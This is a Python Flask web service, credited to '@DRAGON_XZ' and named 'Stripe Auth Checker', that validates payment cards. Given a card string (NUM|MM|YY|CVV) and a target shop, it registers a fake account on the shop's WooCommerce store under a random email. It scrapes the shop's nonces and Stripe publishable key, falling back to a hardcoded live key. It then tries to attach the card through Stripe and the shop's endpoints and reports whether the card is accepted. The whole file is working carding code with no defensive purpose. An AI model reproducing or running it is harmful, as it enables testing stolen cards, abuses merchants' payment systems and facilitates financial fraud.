import asyncio
import re
import json
import random
import base64
import uuid
import warnings
from urllib.parse import urlparse

import aiohttp
from fake_useragent import UserAgent
from flask import Flask, request, Response

warnings.filterwarnings("ignore")

app = Flask(__name__)

_author = "@DRAGON_XZ"
_gateway = "Stripe Auth"


def gets(s, start, end):
    try:
        si = s.index(start) + len(start)
        ei = s.index(end, si)
        return s[si:ei]
    except:
        return None


def parse_card_data(c):
    try:
        parts = c.strip().split('|')
        if len(parts) >= 4:
            return {
                'number': parts[0],
                'exp_month': parts[1],
                'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                'cvc': parts[3].strip()
            }
    except:
        pass
    return None


def gen_email():
    import string
    u = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    return f"{u}{random.randint(100, 9999)}@gmail.com"


def normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url


def gg():
    return str(uuid.uuid4())


async def process_stripe_card(base_url, card_data):
    ua = UserAgent()
    try:
        timeout = aiohttp.ClientTimeout(total=45)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = gen_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(base_url, headers=headers)
            resp_text = await resp.text()
            register_nonce = (
                gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
            )
            if register_nonce:
                await session.post(base_url, headers=headers, data={
                    'email': email,
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                })
            resp2 = await session.get(f"{domain}/my-account/add-payment-method/", headers={'user-agent': ua.random})
            ppt = await resp2.text()
            nonce = (
                gets(ppt, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(ppt, 'add_card_nonce":"', '"') or
                gets(ppt, 'name="add_payment_method_nonce" value="', '"') or
                gets(ppt, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            sk = (
                gets(ppt, '"key":"pk_', '"') or
                gets(ppt, 'data-key="pk_', '"') or
                gets(ppt, 'stripe_key":"pk_', '"') or
                gets(ppt, 'publishable_key":"pk_', '"')
            )
            if not sk:
                m = re.search(r'pk_live_[a-zA-Z0-9]{24,}', ppt)
                if m:
                    sk = m.group(0)
            if not sk:
                sk = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not sk.startswith('pk_'):
                sk = 'pk_' + sk

            sh = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            guid, muid, sid = gg(), gg(), gg()
            sd = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; card-element',
                'referrer': domain,
                'guid': guid, 'muid': muid, 'sid': sid,
                'key': sk,
                '_stripe_version': '2020-08-27',
            }
            pm_id = None
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=sh, data=sd)
            pm_json = await pm_resp.json()
            if 'error' not in pm_json:
                pm_id = pm_json.get('id')
            if not pm_id:
                sd_tok = {
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvc'],
                    'card[exp_month]': card_data['exp_month'],
                    'card[exp_year]': card_data['exp_year'],
                    'card[name]': 'Card Holder',
                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; card-element',
                    'referrer': domain,
                    'guid': gg(), 'muid': gg(), 'sid': gg(),
                    'key': sk,
                    '_stripe_version': '2020-08-27',
                }
                tok_resp = await session.post('https://api.stripe.com/v1/tokens', headers=sh, data=sd_tok)
                tok_json = await tok_resp.json()
                if 'error' in tok_json:
                    return False, tok_json['error']['message']
                pm_id = tok_json.get('id')
            if not pm_id:
                return False, "Failed to create payment method"

            ch = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            for endp in [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]:
                if not nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = nonce
                else:
                    endp['data']['_ajax_nonce'] = nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    r = await session.post(endp['url'], data=endp['data'], headers=ch)
                    t = await r.text()
                    if 'success' in t:
                        js = json.loads(t)
                        if js.get('success'):
                            return True, "Payment method added successfully"
                        else:
                            err = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, err
                except:
                    continue
            return False, "Failed to confirm on site"
    except Exception as e:
        return False, f"Error: {str(e)}"


@app.route('/check', methods=['GET'])
def check():
    cc = request.args.get('cc', '').strip()
    site = request.args.get('site', '').strip()

    def r(data, status=200):
        return Response(json.dumps(data, indent=2), mimetype='application/json', status=status)

    if not cc:
        return r({"Response": "Missing cc parameter. Format: NUM|MM|YY|CVV", "Status": "false", "Gateway": _gateway, "By": _author}, 400)

    if not site:
        return r({"Response": "Missing site parameter.", "Status": "false", "Gateway": _gateway, "By": _author}, 400)

    card_data = parse_card_data(cc)
    if not card_data:
        return r({"Response": "Invalid card format. Use NUM|MM|YY|CVV", "Status": "false", "Gateway": _gateway, "By": _author}, 400)

    url = normalize_url(site)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        ok, msg = loop.run_until_complete(process_stripe_card(url, card_data))
    finally:
        loop.close()

    return r({"Response": msg, "Status": "true" if ok else "false", "Gateway": _gateway, "By": _author})


@app.route('/', methods=['GET'])
def index():
    return Response(json.dumps({"API": "Stripe Auth Checker", "Usage": "/check?cc=NUM|MM|YY|CVV&site=example.com", "By": _author}, indent=2), mimetype='application/json')


if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
